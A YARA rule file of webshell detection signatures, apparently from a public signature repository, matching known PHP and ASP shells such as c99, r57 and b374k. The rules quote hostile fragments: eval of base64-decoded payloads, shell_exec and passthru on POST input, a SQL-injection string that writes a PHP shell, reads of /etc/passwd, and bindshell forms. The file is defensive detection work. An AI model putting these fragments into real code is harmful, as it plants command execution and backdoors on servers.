rule _c99shell_v1_0_php_php_c99php_SsEs_php_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s3 = "if (!empty($delerr)) {echo \"<b>Deleting with errors:</b><br>\".$delerr;}" fullword
	condition:
		1 of them
}
rule _Crystal_php_nshell_php_php_load_shell_php_php {
	meta:
		description = "Semi-Auto-generated  - from files Crystal.php.txt, nshell.php.php.txt, load_shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "fdbf54d5bf3264eb1c4bff1fac548879"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "0c5d227f4aa76785e4760cdcff78a661"
		id = "a92134cd-7f10-589f-bcda-508bc7a20efe"
	strings:
		$s0 = "if ($filename != \".\" and $filename != \"..\"){" fullword
		$s1 = "$dires = $dires . $directory;" fullword
		$s4 = "$arr = array_merge($arr, glob(\"*\"));" fullword
	condition:
		2 of them
}
rule _nst_php_php_cybershell_php_php_img_php_php_nstview_php_php {
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, cybershell.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "ef8828e0bc0641a655de3932199c0527"
		hash2 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash3 = "4745d510fed4378e4b1730f56f25e569"
		id = "cc4dc0e9-dbb1-560b-ae36-23d3e16a407f"
	strings:
		$s0 = "@$rto=$_POST['rto'];" fullword
		$s2 = "SCROLLBAR-TRACK-COLOR: #91AAFF" fullword
		$s3 = "$to1=str_replace(\"//\",\"/\",$to1);" fullword
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_dC3_Security_Crew_Shell_PRiV_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "433706fdc539238803fd47c4394b5109"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
		id = "d22c4cc3-842b-5a24-bf4b-a8024b447b9e"
	strings:
		$s0 = " if ($mode & 0x200) {$world[\"execute\"] = ($world[\"execute\"] == \"x\")?\"t\":"
		$s1 = " $group[\"execute\"] = ($mode & 00010)?\"x\":\"-\";" fullword
	condition:
		all of them
}
rule _c99shell_v1_0_php_php_c99php_1_c2007_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash3 = "d089e7168373a0634e1ac18c0ee00085"
		hash4 = "38fd7e45f9c11a37463c3ded1c76af4c"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "$result = mysql_query(\"SHOW PROCESSLIST\", $sql_sock); " fullword
	condition:
		all of them
}
rule multiple_php_webshells_2 {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash6 = "09609851caa129e40b0d56e90dfc476c"
		hash7 = "671cad517edd254352fe7e0c7c981c39"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "elseif (!empty($ft)) {echo \"<center><b>Manually selected type is incorrect. I"
		$s1 = "else {echo \"<center><b>Unknown extension (\".$ext.\"), please, select type ma"
		$s3 = "$s = \"!^(\".implode(\"|\",$tmp).\")$!i\";" fullword
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_1_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
		id = "4915146e-141c-5515-ac5a-61901d42dc40"
	strings:
		$s0 = "if ($total === FALSE) {$total = 0;}" fullword
		$s1 = "$free_percent = round(100/($total/$free),2);" fullword
		$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
		$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword
	condition:
		2 of them
}
rule _r577_php_php_r57_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
	condition:
		1 of them
}
rule _nixrem_php_php_c99shell_v1_0_php_php_c99php_NIX_REMOTE_WEB_SHELL_v_0_5_alpha_Lite_Public_Version_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
		hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash3 = "f3ca29b7999643507081caab926e2e74"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
		$s1 = "$ret = posix_kill($pid,$sig);" fullword
		$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
		$s3 = "$i = $nixpasswd;" fullword
	condition:
		2 of them
}

/* GIF Header webshell */

rule DarkSecurityTeam_Webshell {
	meta:
		description = "Dark Security Team Webshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
		score = 50
		id = "78dcd62f-9215-5571-a5ef-5f811ce9672f"
	strings:
		$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii
	condition:
		1 of them
}

rule PHP_Cloaked_Webshell_SuperFetchExec {
	meta:
		description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
		reference = "http://goo.gl/xFvioC"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		score = 50
		id = "4611129a-9865-5603-b1ec-7db0058a80d7"
	strings:
		$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"
	condition:
		$s0
}

/* PHP Webshell Update - August 2014 - deducted from https://github.com/JohnTroony/php-webshells */

rule WebShell_RemExp_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword
	condition:
		all of them
}
rule WebShell_dC3_Security_Crew_Shell_PRiV {
	meta:
		description = "PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1b2a4a7174ca170b4e3a8cdf4814c92695134c8a"
		id = "c83bb4ba-6b4e-5a88-925b-b93d08b304e4"
	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s4 = "$ps=str_replace(\"\\\\\",\"/\",getenv('DOCUMENT_ROOT'));" fullword
		$s5 = "header(\"Expires: \".date(\"r\",mktime(0,0,0,1,1,2030)));" fullword
		$s15 = "search_file($_POST['search'],urldecode($_POST['dir']));" fullword
		$s16 = "echo base64_decode($images[$_GET['pic']]);" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword
	condition:
		3 of them
}
rule WebShell_simattacker {
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword
	condition:
		2 of them
}
rule WebShell_DTool_Pro {
	meta:
		description = "PHP Webshells Github Archive - file DTool Pro.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e2ee1c7ba7b05994f65710b7bbf935954f2c3353"
		id = "9f2922d1-b2af-58ae-b194-ecb33577effa"
	strings:
		$s1 = "function PHPget(){inclVar(); if(confirm(\"O PHPget agora oferece uma lista pront"
		$s2 = "<font size=3>by r3v3ng4ns - revengans@gmail.com </font>" fullword
		$s3 = "function PHPwriter(){inclVar();var url=prompt(\"[ PHPwriter ] by r3v3ng4ns\\nDig"
		$s11 = "//Turns the 'ls' command more usefull, showing it as it looks in the shell" fullword
		$s13 = "if (@file_exists(\"/usr/bin/wget\")) $pro3=\"<i>wget</i> at /usr/bin/wget, \";" fullword
		$s14 = "//To keep the changes in the url, when using the 'GET' way to send php variables" fullword
		$s16 = "function PHPf(){inclVar();var o=prompt(\"[ PHPfilEditor ] by r3v3ng4ns\\nDigite "
		$s18 = "if(empty($fu)) $fu = @$_GET['fu'];" fullword
	condition:
		3 of them
}
rule WebShell_IronShell_4 {
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_ironshell"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword
	condition:
		3 of them
}
rule WebShell_indexer_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword
	condition:
		3 of them
}
rule WebShell_toolaspshell {
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword
	condition:
		2 of them
}
rule WebShell_b374k_mini_shell_php_php {
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword
	condition:
		all of them
}
rule WebShell_Sincap_1_0 {
	meta:
		description = "PHP Webshells Github Archive - file Sincap 1.0.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "9b72635ff1410fa40c4e15513ae3a496d54f971c"
		id = "38d39739-660f-596d-a297-1f0dfe530797"
	strings:
		$s4 = "</font></span><a href=\"mailto:shopen@aventgrup.net\">" fullword
		$s5 = "<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) B" fullword
		$s9 = "</span>Avrasya Veri ve NetWork Teknolojileri Geli" fullword
		$s12 = "while (($ekinci=readdir ($sedat))){" fullword
		$s19 = "$deger2= \"$ich[$tampon4]\";" fullword
	condition:
		2 of them
}
rule WebShell_b374k_php {
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("
	condition:
		3 of them
}
rule WebShell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend {
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword
	condition:
		3 of them
}
rule WebShell_h4ntu_shell__powered_by_tsoi_ {
	meta:
		description = "PHP Webshells Github Archive - file h4ntu shell [powered by tsoi].php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "cbca8cd000e705357e2a7e0cf8262678706f18f9"
		id = "5a12a025-6497-545a-8da0-423ef448e374"
	strings:
		$s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword
		$s13 = "$cmd = $_POST['cmd'];" fullword
		$s16 = "$uname = posix_uname( );" fullword
		$s17 = "if(!$whoami)$whoami=exec(\"whoami\");" fullword
		$s18 = "echo \"<p><font size=2 face=Verdana><b>This Is The Server Information</b></font>"
		$s20 = "ob_end_clean();" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_MyShell {
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword
	condition:
		3 of them
}
rule WebShell_php_webshells_pws {
	meta:
		description = "PHP Webshells Github Archive - file pws.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "7a405f1c179a84ff8ac09a42177a2bcd8a1a481b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s6 = "if ($_POST['cmd']){" fullword
		$s7 = "$cmd = $_POST['cmd'];" fullword
		$s10 = "echo \"FILE UPLOADED TO $dez\";" fullword
		$s11 = "if (file_exists($uploaded)) {" fullword
		$s12 = "copy($uploaded, $dez);" fullword
		$s17 = "passthru($cmd);" fullword
	condition:
		4 of them
}
rule WebShell_reader_asp_php {
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"
	condition:
		3 of them
}
rule WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_3 {
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode_Bypass_PHP_4.4.2_and_PHP_5.1.2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2"
		hash = "db076b7c80d2a5279cab2578aa19cb18aea92832"
		id = "349cf6ac-92b3-59f7-a6e4-c23e69b454c6"
	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword
		$s9 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
		$s11 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File" fullword
		$s15 = "if(empty($_GET['file'])){" fullword
		$s16 = "echo \"<head><title>Safe Mode Shell</title></head>\"; " fullword
	condition:
		3 of them
}
rule WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2 {
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		id = "b647f529-be81-51ad-b671-84aec410e133"
	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
	condition:
		1 of them
}
rule WebShell_PHP_Backdoor_2 {
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_php_backdoor"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
	condition:
		1 of them
}
rule WebShell_Worse_Linux_Shell_2 {
	meta:
		description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		old_rule_name = "WebShell_Worse_Linux_Shell"
		hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
		id = "04ed7464-29d1-54b9-98ff-afc03475b220"
	strings:
		$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
		$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
		$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
		$s8 = "$currentCMD = \"ls -la\";" fullword
		$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
		$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_pHpINJ {
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword
	condition:
		1 of them
}
rule WebShell_php_webshells_NGH {
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword
	condition:
		2 of them
}
rule WebShell_php_webshells_matamu {
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword
	condition:
		2 of them
}
rule WebShell_ru24_post_sh {
	meta:
		description = "PHP Webshells Github Archive - file ru24_post_sh.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "d2c18766a1cd4dda928c12ff7b519578ccec0769"
		id = "86a45d72-c42d-58d5-9969-d3ebfc22853d"
	strings:
		$s1 = "http://www.ru24-team.net" fullword
		$s4 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s6 = "Ru24PostWebShell"
		$s7 = "Writed by DreAmeRz" fullword
		$s9 = "$function=passthru; // system, exec, cmd" fullword
	condition:
		1 of them
}
rule WebShell_hiddens_shell_v1 {
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
	condition:
		all of them
}
rule WebShell_c99_madnet {
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword
	condition:
		all of them
}
